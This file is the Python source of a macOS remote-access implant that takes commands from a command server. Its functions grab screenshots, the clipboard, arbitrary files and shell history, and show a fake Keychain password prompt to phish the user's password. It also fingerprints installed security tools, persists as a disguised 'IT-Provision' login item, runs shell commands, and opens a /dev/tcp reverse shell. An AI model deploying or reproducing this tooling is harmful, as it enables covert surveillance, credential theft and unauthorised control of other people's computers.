import pwd
import urllib2
import urllib
import sys
import os
import random
import ssl
import time
import commands
import AppKit
from AppKit import NSPasteboard, NSStringPboardType
import glob
from glob import glob
import platform
import getpass
import Foundation
from Foundation import *
from Cocoa import *
from objc import *
import SystemConfiguration
import LaunchServices
import PyObjCTools
from PyObjCTools import *
from PyObjCTools import Conversion
from LaunchServices import kLSSharedFileListSessionLoginItems, kLSSharedFileListNoUserInteraction
from Foundation import NSBundle
import inspect
import grp
import Quartz
import Quartz.CoreGraphics as CG
from Cocoa import NSURL
import subprocess
import shutil


letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890'
token = ''.join(random.choice(letters) for i in range(254))
token2 = 'Bearer valid' + token
sleep = 10


####################
def screenshot():
    try:
        region = CG.CGRectInfinite
        path = '/private/var/tmp/out.png'
        image = CG.CGWindowListCreateImage(region, CG.kCGWindowListOptionOnScreenOnly, CG.kCGNullWindowID, CG.kCGWindowImageDefault)
        imagepath = NSURL.fileURLWithPath_(path)
        dest = Quartz.CGImageDestinationCreateWithURL(imagepath, LaunchServices.kUTTypePNG, 1, None)
        properties = {Quartz.kCGImagePropertyDPIWidth: 1024, Quartz.kCGImagePropertyDPIHeight: 720,}
        Quartz.CGImageDestinationAddImage(dest, image, properties)
        x = Quartz.CGImageDestinationFinalize(dest)
                
        with open('/private/var/tmp/out.png', 'rb') as fl:
            x = fl.read()
            vals = {'content':x}
            srvr = 'https://127.0.0.1/validatiion/profile/1'
            req = urllib2.Request(srvr,headers=headers,data=vals.get('content'))
            resp = urllib2.urlopen(req,context=context)
            respn = resp.read()
        fl.close()
        os.remove('/private/var/tmp/out.png')
 
    except Exception as e:
        vals = {'content':e}
        vals2 = urllib.urlencode(vals)
        srvr = 'https://127.0.0.1/validatiion/profile/1'
        req = urllib2.Request(srvr,headers=headers,data=vals2)
        resp = urllib2.urlopen(req,context=context)
        respn = resp.read()

#####################
def download(data):
    data2 = str(data).replace('download ',"")
    if os.path.exists(data2):
        try:
            with open ("%s" % str(data2), 'rb') as file:
                info = file.read()
                values = {'content':info}
                values2 = urllib.urlencode(values)
                srv = 'https://127.0.0.1/validatiion/profile/2'
                request = urllib2.Request(srv,headers=headers,data=values2)
                response = urllib2.urlopen(request,context=context)
                resp = response.read()
            file.close()
        except Exception as e:
            values = {'error':e}
            values2 = urllib.urlencode(values)
            srv = 'https://127.0.0.1/validatiion/profile/2'
            request = urllib2.Request(srv,headers=headers,data=values2)
            response = urllib2.urlopen(request,context=context)
            resp = response.read()
    else:
        values = {'error':'[-] File not found'}
        values2 = urllib.urlencode(values)
        srv = 'https://127.0.0.1/validatiion/profile/2'
        request = urllib2.Request(srv,headers=headers,data=values2)
        response = urllib2.urlopen(request,context=context)
        resp = response.read()
#######################    
def clipboard():
    try:
        pboard = NSPasteboard.generalPasteboard()
        pString = pboard.stringForType_(NSStringPboardType)
        pString2 = str(pString).encode('utf8')
        v = {'content':pString}
        s = 'https://127.0.0.1/validatiion/profile/6'
        r = urllib2.Request(s,headers=headers,data=v.get('content'))
        re = urllib2.urlopen(r,context=context)
        respn = re.read()
    except Exception as e:
        values = {'error':str(e)}
        srv = 'https://127.0.0.1/validatiion/profile/6'
        request = urllib2.Request(srv,headers=headers,data=values.get('error'))
        response = urllib2.urlopen(request,context=context)
        resp = response.read()
########################
def pwd():
    try:
        curdir = os.getcwd()
        d = {'content':curdir}
        k = 'https://127.0.0.1/validatiion/profile/3'
        b = urllib2.Request(k,headers=headers,data=d.get('content'))
        c = urllib2.urlopen(b,context=context)
        q = c.read()
    except Exception as e:
        d = {'error':str(e)}
        k = 'https://127.0.0.1/validatiion/profile/3'
        b = urllib2.Request(k,headers=headers,data=d.get('error'))
        c = urllib2.urlopen(b,context=context)
        q = c.read()
#########################
def listdir():
    try:
        dirs = glob("./*/")
        files = [x for x in os.listdir('.') if os.path.isfile(x)]
        total = dirs + files
        total2 = ','.join(total)
        a = {'content':total2}
        b = 'https://127.0.0.1/validatiion/profile/5'
        c = urllib2.Request(b,headers=headers,data=a.get('content'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
    except Exception as e:
        a = {'error':str(e)}
        b = 'https://127.0.0.1/validatiion/profile/5'
        c = urllib2.Request(b,headers=headers,data=a.get('error'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
###########################
def cd(data):
    try:
        data2 = data.replace('cd ','')
        os.chdir(data2)
        a = {'content':'[+] Successfully changed dir to %s'%data2}
        b = 'https://127.0.0.1/validatiion/profile/4'
        c = urllib2.Request(b,headers=headers,data=a.get('content'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
    except Exception as e:
        a = {'error':str(e)}
        b = 'https://127.0.0.1/validatiion/profile/4'
        c = urllib2.Request(b,headers=headers,data=a.get('error'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
############################
def systeminfo():
    try:
        s = NSAppleScript.alloc().initWithSource_("get system info")
        p = s.executeAndReturnError_(None)
        p2 = str(p).replace("<NSAppleEventDescriptor: ","").replace(">, None)", "")
        a = {'content':p2}
        b = 'https://127.0.0.1/validatiion/profile/14'
        c = urllib2.Request(b,headers=headers,data=a.get('content'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
    except Exception as e:
        a = {'error':str(e)}
        b = 'https://127.0.0.1/validatiion/profile/14'
        c = urllib2.Request(b,headers=headers,data=a.get('error'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
############################
def listusers():
    try:
        home = glob("/Users/*")
        ulist = []
        for each in home:
            ulist.append(each.replace("/Users/",""))
        users = ','.join(ulist)
        a = {'content':users}
        b = 'https://127.0.0.1/validatiion/profile/10'
        c = urllib2.Request(b,headers=headers,data=a.get('content'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
    except Exception as e:
        a = {'error':str(e)}
        b = 'https://127.0.0.1/validatiion/profile/10'
        c = urllib2.Request(b,headers=headers,data=a.get('error'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
#############################
def addresses():
    try:
        s = NSAppleScript.alloc().initWithSource_("set ipaddress to IPv4 address of (get system info)")
        p = s.executeAndReturnError_(None)
        p2 = str(p).replace("<NSAppleEventDescriptor: ","").replace(">, None)", "")
        a = {'content':p2}
        b = 'https://127.0.0.1/validatiion/profile/9'
        c = urllib2.Request(b,headers=headers,data=a.get('content'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
    except Exception as e:
        a = {'error':str(e)}
        b = 'https://127.0.0.1/validatiion/profile/9'
        c = urllib2.Request(b,headers=headers,data=a.get('error'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
#############################
def prompt():
    try:
        s = NSAppleScript.alloc().initWithSource_("set popup to display dialog \"Keychain Access wants to use the login keychain\" & return & return & \"Please enter the keychain password\" & return default answer \"\" with title \"Authentication Needed\" with hidden answer")
        p = s.executeAndReturnError_(None)
        p2 = str(p)
        a = {'content':p2}
        b = 'https://127.0.0.1/validatiion/profile/7'
        c = urllib2.Request(b,headers=headers,data=a.get('content'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
    except Exception as e:
        a = {'error':str(e)}
        b = 'https://127.0.0.1/validatiion/profile/7'
        c = urllib2.Request(b,headers=headers,data=a.get('error'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
##############################
def userhist():
    try:
        s = open('/Users/%s/.zsh_history'%str(getpass.getuser()),'r').read()
        a = {'content':s}
        b = 'https://127.0.0.1/validatiion/profile/11'
        c = urllib2.Request(b,headers=headers,data=a.get('content'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
    except Exception as e:
        a = {'error':str(e)}
        b = 'https://127.0.0.1/validatiion/profile/11'
        c = urllib2.Request(b,headers=headers,data=a.get('error'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
##############################
def checksecurity():
    try:
        x = NSWorkspace.sharedWorkspace().runningApplications()
        y = str(x)
        seclist = []
        z = 0
                
        if ('CbOsxSensorService' in each) or (os.path.exists("/Applications/CarbonBlack/CbOsxSensorService")):
            seclist.append("[+] Carbon Black OSX Sensor found")
            z = z + 1
        if ('CbDefense' in each) or (os.path.exists("/Appllications/Confer.app")):
            seclist.append("[+] CB Defense A/V found")
            z = z + 1
        if ('ESET' in each) or ('eset' in each) or (os.path.exists("Library/Application Support/com.eset.remoteadministrator.agent")):
            seclist.append("[+] ESET A/V found")
            z = z + 1
        if ('Littlesnitch' in each) or ('Snitch' in each) or (os.path.exists("/Library/Little Snitch/")):
            seclist.append("[+] Littlesnitch firewall found")
            z = z + 1
        if ('xagt' in each) or (os.path.exists("/Library/FireEye/xagt")):
            seclist.append("[+] FireEye HX Host Agent found")
            z = z + 1
        if ('falconctl' in each) or (os.path.exists("/Library/CS/falcond")):
            seclist.append("[+] Crowdstrike Falcon Host Agent found")
            z = z + 1
        if ('OpenDNS' in each) or ('opendns' in each) or (os.path.exists("/Library/Application Support/OpenDNS Roaming Client/dns-updater")):
            seclist.append("[+] OpenDNS Client found")
            z = z + 1
        if 'SentinelOne' in each or 'sentinelone' in each:
            seclist.append("[+] SentinelOne Host Agent found")
            z = z + 1
        if ('GlobalProtect' in each) or ('PanGPS' in each) or (os.path.exists("/Library/Logs/PaloAltoNetworks/GlobalProtect")):
            seclist.append("[+] Global Protect PAN VPN client found")
            z = z + 1
        if ('HostChecker' in each) or ('pulsesecure' in each) or (os.path.exists("/Applications/Pulse Secure.app")):
            seclist.append("[+] Pulse VPN client found")
            z = z + 1
        if ('AMP-for-Endpoints' in each) or (os.path.exists("/opt/cisco/amp")):
            seclist.append("[+] Cisco AMP for endpoints found")
            z = z + 1
        if os.path.exists("/usr/local/bin/jamf") or os.path.exists("/usr/local/jamf"):
            seclist.append("[+] JAMF agent found")
            z = z + 1
        if os.path.exists("/Library/Application Support/Malwarebytes"):
            seclist.append("[+] Malwarebytes A/V found")
            z = z + 1
        if os.path.exists("/usr/local/bin/osqueryi"):
            seclist.append("[+] osquery found")
            z = z + 1
        if os.path.exists("/Library/Sophos Anti-Virus/"):
            seclist.append("[+] Sophos antivirus found")
            z = z + 1
        if ('lulu' in each) or (os.path.exists("/Library/Objective-See/Lulu")) or (os.path.exists("/Applications/LuLu.app")):
            seclist.append("[+] Objective-See LuLu firewall found")
            z = z + 1
        if ('dnd' in each) or (os.path.exists("/Library/Objective-See/DND")) or (os.path.exists("/Applications/Do Not Disturb.app/")):
            seclist.append("[+] Objective-See Do Not Disturb found")
            z = z + 1
        if ('WhatsYourSign' in each) or (os.path.exists("/Applications/WhatsYourSign.app")):
            seclist.append("[+] Objective-See Whats Your Sign found")
            z = z + 1
        if ('KnockKnock' in each) or (os.path.exists("/Applications/KnockKnock.app:")):
            seclist.append("[+] Objective-See Knock Knock found")
            z = z + 1
        if ('reikey' in each) or (os.path.exists("/Applications/ReiKey.app")):
            seclist.append("[+] Objective-See ReiKey found")
            z = z + 1
        if ('OverSight' in each) or (os.path.exists("/Applications/OverSight.app")):
            seclist.append("[+] Objective-See OverSight found")
            z = z + 1
        if ('KextViewr' in each) or (os.path.exists("/Applications/KextViewr.app")):
            seclist.append("[+] Objective-See KextViewr found")
            z = z + 1
        if ('blockblock' in each) or (os.path.exists("/Applications/BlockBlock Helper.app")):
            seclist.append("[+] Objective-See BlockBlock found")
            z = z + 1
        if ('Netiquete' in each) or (os.path.exists("/Applications/Netiquette.app")):
            seclist.append("[+] Objective-See Netiquette found")
            z = z + 1
        if ('processmonitor' in each) or (os.path.exists("/Applications/ProcessMonitor.app")):
            seclist.append("[+] Objective-See Process Monitor found")
            z = z + 1
        if ('filemonitor' in each) or (os.path.exists("/Applications/FileMonitor.app")):
            seclist.append("[+] Objective-See File Monitor found")
            z = z + 1

        if z == 0:
            sendstring = "[-] No matches found during security product check."
            a = {'content':sendstring}
            b = 'https://127.0.0.1/validatiion/profile/12'
            c = urllib2.Request(b,headers=headers,data=a.get('content'))
            d = urllib2.urlopen(c,context=context)
            e = d.read()
        else:
            secstring = ','.join(seclist)
            a = {'content':secstring}
            b = 'https://127.0.0.1/validatiion/profile/12'
            c = urllib2.Request(b,headers=headers,data=a.get('content'))
            d = urllib2.urlopen(c,context=context)
            e = d.read()
    except Exception as e:
        a = {'error':str(e)}
        b = 'https://127.0.0.1/validatiion/profile/12'
        c = urllib2.Request(b,headers=headers,data=a.get('error'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
#################################
def persist():
    try:
        lfile = open('/private/var/tmp/IT-Provision.command', 'w')
        lfile.write('#!/bin/zsh\n\n')
        lfile.write('python /private/var/tmp/IT-Provision.py &')
        lfile.close()
        st = os.stat("/private/var/tmp/IT-Provision.command")
        os.chmod("/private/var/tmp/IT-Provision.command",st.st_mode | 0o111)

        shutil.copy(__file__, '/private/var/tmp/IT-Provision.py')
        st = os.stat("/private/var/tmp/IT-Provision.py")
        os.chmod("/private/var/tmp/IT-Provision.py",st.st_mode | 0o111)
        SFL_bundle = NSBundle.bundleWithIdentifier_('com.apple.coreservices.SharedFileList')
        functions  = [('LSSharedFileListCreate',              '^{OpaqueLSSharedFileListRef=}^{__CFAllocator=}^{__CFString=}@'),
                      ('LSSharedFileListCopySnapshot',        '^{__CFArray=}^{OpaqueLSSharedFileListRef=}o^I'),
                      ('LSSharedFileListItemCopyDisplayName', '^{__CFString=}^{OpaqueLSSharedFileListItemRef=}'),
                      ('LSSharedFileListItemResolve',         'i^{OpaqueLSSharedFileListItemRef=}Io^^{__CFURL=}o^{FSRef=[80C]}'),
                      ('LSSharedFileListItemMove',            'i^{OpaqueLSSharedFileListRef=}^{OpaqueLSSharedFileListItemRef=}^{OpaqueLSSharedFileListItemRef=}'),
                      ('LSSharedFileListItemRemove',          'i^{OpaqueLSSharedFileListRef=}^{OpaqueLSSharedFileListItemRef=}'),
                      ('LSSharedFileListInsertItemURL',       '^{OpaqueLSSharedFileListItemRef=}^{OpaqueLSSharedFileListRef=}^{OpaqueLSSharedFileListItemRef=}^{__CFString=}^{OpaqueIconRef=}^{__CFURL=}^{__CFDictionary=}^{__CFArray=}'),
                      ('kLSSharedFileListItemBeforeFirst',    '^{OpaqueLSSharedFileListItemRef=}'),
                      ('kLSSharedFileListItemLast',           '^{OpaqueLSSharedFileListItemRef=}'),]
        objc.loadBundleFunctions(SFL_bundle, globals(), functions)
        list_ref = LSSharedFileListCreate(None, kLSSharedFileListSessionLoginItems, None)
        login_items,_ = LSSharedFileListCopySnapshot(list_ref, None)
        x = [list_ref,login_items]
        lref, citems = x
        added_item = NSURL.fileURLWithPath_('/var/tmp/IT-Provision.command')
        dpoint = kLSSharedFileListItemLast
        result = LSSharedFileListInsertItemURL(lref,dpoint,None,None,added_item,{},[])
        sendstring = "[+] Login Item persistence successful"
        a = {'content':sendstring}
        b = 'https://127.0.0.1/validatiion/profile/18'
        c = urllib2.Request(b,headers=headers,data=a.get('content'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
    except Exception as e:
        a = {'error':str(e)}
        b = 'https://127.0.0.1/validatiion/profile/18'
        c = urllib2.Request(b,headers=headers,data=a.get('error'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
#####################################
def unpersist():
    try:
        SFL_bundle = NSBundle.bundleWithIdentifier_('com.apple.coreservices.SharedFileList')
        functions  = [('LSSharedFileListCreate',              '^{OpaqueLSSharedFileListRef=}^{__CFAllocator=}^{__CFString=}@'),
                      ('LSSharedFileListCopySnapshot',        '^{__CFArray=}^{OpaqueLSSharedFileListRef=}o^I'),
                      ('LSSharedFileListItemCopyDisplayName', '^{__CFString=}^{OpaqueLSSharedFileListItemRef=}'),
                      ('LSSharedFileListItemResolve',         'i^{OpaqueLSSharedFileListItemRef=}Io^^{__CFURL=}o^{FSRef=[80C]}'),
                      ('LSSharedFileListItemMove',            'i^{OpaqueLSSharedFileListRef=}^{OpaqueLSSharedFileListItemRef=}^{OpaqueLSSharedFileListItemRef=}'),
                      ('LSSharedFileListItemRemove',          'i^{OpaqueLSSharedFileListRef=}^{OpaqueLSSharedFileListItemRef=}'),
                      ('LSSharedFileListInsertItemURL',       '^{OpaqueLSSharedFileListItemRef=}^{OpaqueLSSharedFileListRef=}^{OpaqueLSSharedFileListItemRef=}^{__CFString=}^{OpaqueIconRef=}^{__CFURL=}^{__CFDictionary=}^{__CFArray=}'),
                      ('kLSSharedFileListItemBeforeFirst',    '^{OpaqueLSSharedFileListItemRef=}'),
                      ('kLSSharedFileListItemLast',           '^{OpaqueLSSharedFileListItemRef=}'),]
 
        objc.loadBundleFunctions(SFL_bundle, globals(), functions)
        list_ref = LSSharedFileListCreate(None, kLSSharedFileListSessionLoginItems, None)
        login_items,_ = LSSharedFileListCopySnapshot(list_ref, None)
        x = [list_ref, login_items]
        url_list = []
        for items in x[1]:
            err, a_CFURL, a_FSRef = LSSharedFileListItemResolve(items, kLSSharedFileListNoUserInteraction + kLSSharedFileListNoUserInteraction, None, None)
            url_list.append(a_CFURL)
        path = NSURL.fileURLWithPath_('/private/var/tmp/IT-Provision.command')
        if path in url_list:
            i = url_list.index(path)
            target = login_items[i]
            result = LSSharedFileListItemRemove(list_ref, target)

        os.remove('/private/var/tmp/IT-Provision.command')
        os.remove('/private/var/tmp/IT-Provision.py')
        sendstring = "[+] Login Item persistence and files removed"
        a = {'content':sendstring}
        b = 'https://127.0.0.1/validatiion/profile/19'
        c = urllib2.Request(b,headers=headers,data=a.get('content'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
    except Exception as e:
        a = {'error':str(e)}
        b = 'https://127.0.0.1/validatiion/profile/19'
        c = urllib2.Request(b,headers=headers,data=a.get('error'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
#############################
def catfile(data):
    data2 = str(data).replace('cat ',"")
    if os.path.exists(data2):
        try:
            with open ("%s" % str(data2), 'rb') as file:
                info = file.read()
                values = {'content':info}
                values2 = urllib.urlencode(values)
                srv = 'https://127.0.0.1/validatiion/profile/15'
                request = urllib2.Request(srv,headers=headers,data=values2)
                response = urllib2.urlopen(request,context=context)
                resp = response.read()
            file.close()
        except Exception as e:
            values = {'error':e}
            values2 = urllib.urlencode(values)
            srv = 'https://127.0.0.1/validatiion/profile/15'
            request = urllib2.Request(srv,headers=headers,data=values2)
            response = urllib2.urlopen(request,context=context)
            resp = response.read()
    else:
        values = {'error':'[-] File not found'}
        values2 = urllib.urlencode(values)
        srv = 'https://127.0.0.1/validatiion/profile/15'
        request = urllib2.Request(srv,headers=headers,data=values2)
        response = urllib2.urlopen(request,context=context)
        resp = response.read()
##############################
def whoami():
    try:
        username = getpass.getuser()
        groups = [g.gr_name for g in grp.getgrall() if username in g.gr_mem]
        groups2 = ','.join(groups).replace(',',' | ')
        sendstring1 = "[+] username: %s" % username
        sendstring2 = "   groups: %s" % groups2
        sendstring = sendstring1 + sendstring2
        a = {'content':sendstring}
        b = 'https://127.0.0.1/validatiion/profile/13'
        c = urllib2.Request(b,headers=headers,data=a.get('content'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
    except Exception as e:
        a = {'error':str(e)}
        b = 'https://127.0.0.1/validatiion/profile/13'
        c = urllib2.Request(b,headers=headers,data=a.get('error'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
##############################
def srun(data):
    try:
        data2 = str(data).replace('shell ',"")
        sendstring = str(commands.getstatusoutput("%s" % data2))
        a = {'content':sendstring}
        b = 'https://127.0.0.1/validatiion/profile/16'
        c = urllib2.Request(b,headers=headers,data=a.get('content'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
    except Exception as e:
        a = {'error':str(e)}
        b = 'https://127.0.0.1/validatiion/profile/16'
        c = urllib2.Request(b,headers=headers,data=a.get('error'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
###############################
def sspawn(data):
    try:
        data2 = data.replace("spawn ","")
        data3 = data2.split(':')
        ip = data3[0]
        port = data3[1]
        scmd = "bash -i>& /dev/tcp/%s/%s 0>&1" % (str(ip),str(port))
        subprocess.Popen(scmd,shell=True)
        sendstring = "[+] spawn command successfully sent a shell to %s on port %s" % (str(ip),str(port))
        a = {'content':sendstring}
        b = 'https://127.0.0.1/validatiion/profile/8'
        c = urllib2.Request(b,headers=headers,data=a.get('content'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
    except Exception as e:
        a = {'error':str(e)}
        b = 'https://127.0.0.1/validatiion/profile/8'
        c = urllib2.Request(b,headers=headers,data=a.get('error'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
################################
def ckin():
    try:
        url2 = 'https://127.0.0.1/validate/status'
        request = urllib2.Request(url2,headers=headers)
        response = urllib2.urlopen(request,context=context)
        data_read = response.read()
        datalist = str(data_read).replace("\"","").replace("[","").replace("]","").split(',')
        return datalist
    except Exception as e:
        pass
################################
def slp(data):
    data2 = data.replace("sleep ","")
    data3 = int(data2)
    return data3
################################

url1 = 'https://127.0.0.1/initializee/sequence/0'
uagent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36'
headers = {'User-Agent':uagent, 'Authorization':token2}
context = ssl._create_unverified_context()
request = urllib2.Request(url1,headers=headers)
response = urllib2.urlopen(request,context=context)

time.sleep(2)
    
while True:
    rslts = ckin()
    if not rslts:
        pass
    else:
        for each in rslts:
            
            data = each.lstrip().strip()
            if data.find('exit') != -1:
                sys.exit(0)
            elif data.find('screencapture') != -1:
                screenshot()           
            elif data.find('download ') != -1:
                download(data)
            elif data.find('clipboard') != -1:
                clipboard()
            elif data == 'pwd':
                pwd()
            elif data == 'listdir':
                listdir()
            elif data.find('cd ') != -1 and 'shell' not in data:
                cd(data)
            elif data == 'systeminfo':
                systeminfo()
            elif data == 'listusers':
                listusers()
            elif data == 'addresses':
                addresses()
            elif data == 'prompt':
                prompt()
            elif data == 'userhist':
                userhist()
            elif data == 'checksecurity':
                checksecurity()
            elif data == 'persist':
                persist()
            elif data == 'unpersist':
                unpersist()
            elif ('cat ' in data) and ('shell' not in data):
                catfile(data)
            elif data == 'whoami':
                whoami()
            elif 'shell ' in data:
                srun(data)
            elif 'spawn ' in data:
                sspawn(data)
            elif 'sleep ' in data:
                sleep = slp(data)
        
    time.sleep(sleep)

    
    
                
            
                    

